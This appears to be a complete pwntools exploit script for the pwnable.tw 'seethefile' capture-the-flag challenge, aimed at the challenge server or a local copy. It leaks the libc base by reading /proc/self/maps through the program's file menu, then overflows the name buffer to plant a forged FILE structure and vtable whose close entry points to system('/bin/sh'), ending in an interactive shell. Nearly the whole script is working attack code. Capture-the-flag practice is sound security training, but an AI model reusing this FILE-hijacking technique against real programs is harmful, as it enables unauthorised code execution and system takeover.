#!/usr/bin/env python3
from pwn import *

DWORD = 4
DUMMY = 0xdeadbeef


## what you get for sizeof(FILE) == 148
## *FILE + 148, will always be vtable
## struct _IO_FILE_plus
## {
##    _IO_FILE file;
##    const struct _IO_jump_t *vtable;
## }

FILE_IO_SIZE = 148
FILE_IO_PLUS_SIZE = FILE_IO_SIZE + DWORD

FILE_VTABLE_SIZE = DWORD * 24


elf = ELF("./seethefile_patched")
libc = ELF("./given/libc_32.so.6")
ld = ELF("./ld-2.23.so")
context.arch = "i386"


class FakeFilePtr:
    def __init__(self, base, lock_addr, vtable_addr):
        self.base = base
        self.vtable = vtable_addr
        self.lock_addr = lock_addr

    def dump(self):
        # payload = p32(self.header)
        payload = b"/bin/sh\x00".ljust(0x48, b"\x00")
        payload += p32(self.lock_addr)
        payload = payload.ljust(FILE_IO_SIZE, b"\x00")
        payload += p32(self.vtable)
        return payload


class FakeFileVtable:
    def __init__(self, name2callee):
        name2offset = {"read": 0x38, "write": 0x3c, "seek": 0x40,
                      "close": 0x44}
        self.offset2callee = {}
        for func_name, callee in name2callee.items():
            log.info("replacing " + func_name + " with " + hex(callee))
            self.offset2callee[name2offset[func_name]] = callee

    def dump(self):
        payload = b"a" * DWORD * 24
        for offset, callee in self.offset2callee.items():
            payload = payload[:offset] + p32(callee) + payload[offset+DWORD:]
        return payload


class FakeIOLock:
    def __init__(self):
        # works fine for padding null bytes
        pass

    def dump(self):
        return p32(0) + p32(0) + p32(0)

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10200)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        gdb.attach(p)

def openfile(filename):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"What do you want to see :", filename)

def readfile():
    p.sendlineafter(b"Your choice :", b"2")
    msg = p.recvuntil(b"---------------MENU---------------")
    return b"Read Successful" in msg

def writefile():
    p.sendlineafter(b"Your choice :", b"3")
    content = p.recvn(399)
    return content


def leak_libc_base():
    openfile(b"/proc/self/maps")
    mem_map = b""
    while readfile():
        mem_map += writefile()

    areas = mem_map.split(b"\n")
    libc_map = None
    if args.REMOTE:
        is_libc = lambda s: b"/lib32/libc-2.23.so" in s
    else:
        is_libc = lambda s: libc.path.encode() in s

    for area in areas:
        if is_libc(area):
            libc_map = area
            break
    log.info(libc_map)
    libc_base = int(libc_map[:libc_map.find(b"-")].decode(), 16)
    return libc_base

def bufovfl():
    p.sendlineafter(b"Your choice :", b"5")

    # this vuln allow as to gets at 0x804b260
    data_buf = 0x804b260
    data_fp = data_buf + 0x20
    fake_file_struct_base = data_fp + DWORD
    fake_file_vtable = fake_file_struct_base + FILE_IO_SIZE + 4
    fake_file_lock = fake_file_vtable + FILE_VTABLE_SIZE

    payload = b"a" * 0x20 + p32(fake_file_struct_base)
    payload += FakeFilePtr(fake_file_struct_base, fake_file_lock, fake_file_vtable).dump()
    payload += FakeFileVtable({"close": libc.symbols['system']}).dump()
    payload += FakeIOLock().dump()

    p.sendlineafter(b"Leave your name :", payload)


def exploit():
    libc.address = leak_libc_base()
    print("system:", hex(libc.symbols['system']))
    bufovfl()
    p.interactive()


if __name__ == "__main__":
    exploit()


